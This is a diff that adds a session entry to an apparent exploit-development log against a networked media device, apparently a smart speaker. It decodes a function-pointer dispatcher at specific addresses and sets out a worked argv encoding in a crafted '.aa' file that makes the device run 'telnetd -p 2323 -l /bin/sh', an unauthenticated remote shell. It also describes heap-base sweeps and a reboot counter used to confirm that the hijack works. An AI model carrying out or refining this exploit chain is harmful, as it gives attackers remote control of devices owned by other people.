@@ -2760,3 +2760,47 @@ calibrate F so the chain resolves cleanly, then re-test.
 `aafire3`), `:8902` (`audio/aac` type, `aac8902`), `:8903` (Range-capable,
 `rng8903`); css `:1400` (`aa1400`, `/tmp/aa_www`). The payloads
 `jffsex.aa`, `jt.aa`, `jcell.aa`, `g5723.upd`, `g65130.upd` are in both dirs.
+
+### 2026-11-09 (session 20g) — the dispatcher decoded exactly; why nothing executes; the argv encoding
+
+Static decode of the two functions settles the chain shape (all of it, not a
+summary):
+
+```
+0x102bdedc(obj):  r9 = [obj+6404]; if (r9 == 0) return 0; else return [r9+8]
+0x102bf778(obj, a2..a5): lock obj+6100
+                 r = 0x102bdedc(obj)
+                 if r: FN = [[r]+28]; FN(r, a2, a3, a4, a5)
+```
+
+So: `[obj+6404]` → `+8` → then **two** derefs for the function, and **r3 is
+that same pointer `r`**. Consequences, none of them optional:
+
+- `r3` is a *data* pointer, not a string. With `FN = system@GOT` the shell
+  reads the four bytes of the next pointer as the start of the command — i.e.
+  `system(0x106c69d0)` runs the *pointer's bytes*, which is why every .aa
+  fire so far was inert. This is the "argv comes from an uncontrolled
+  source" note in the campaign handoff, now precise.
+- The working encoding is the **exec wrapper** (`0x104044c0`, which takes
+  `r3` = an argv array): make `[r]` point at a path string, and the bytes at
+  `r+4`, `r+8`, … the remaining argv entries, NUL-terminated array. Worked
+  example now in `jargv.aa`: `r` = `C+500`; `[r]` = `C+528` → `/bin/sh`;
+  `[r+4]` = `C+560` → `-c`; `[r+8]` = `C+568` → `telnetd -p 2323 -l /bin/sh`.
+- With the observer cell, the dispatch object is the cell's `F`, so
+  `[F+6404]` must land on our A slot: the cell must hold **C** and A must be
+  at copy node 6404. (For a *direct* dispatch the object is the session and
+  the field is node **24**; `JFFSEX_84.aa` has node 24 = 0, so it can only
+  work through a cell.)
+- JFFSEX's whole pointer set is self-consistent with a copy base
+  `C = 0x106c67dc` = its node-0 dword: `A = C+420`, `B = C+500`, `V = C+528`,
+  `FN` at node 556. So node 0 *is* C and the file is C-relative.
+
+**Reboot oracle (needed, because the playback blip is a red herring):** a
+benign 4 KB `.aa` shows the same 16-36 s `/status` blip as a payload, so the
+blip is teardown, not the chain. The honest oracle is the **per-boot counter**
+in `GetZoneGroupState` (`ID="RINCON_…:<counter>"`): it changes only on a real
+reboot. Firing `jrb.aa` (FN = reboot gadget) moved it not at all.
+
+C is stale (heap re-seeded), and a 12-step sweep of `C ± 8 KB` (0x400 steps,
+cell = C, FN = reboot gadget) produced no reboot — the old `0x106c67dc`
+included. Calibrating C is the current task; the oracle is the counter.
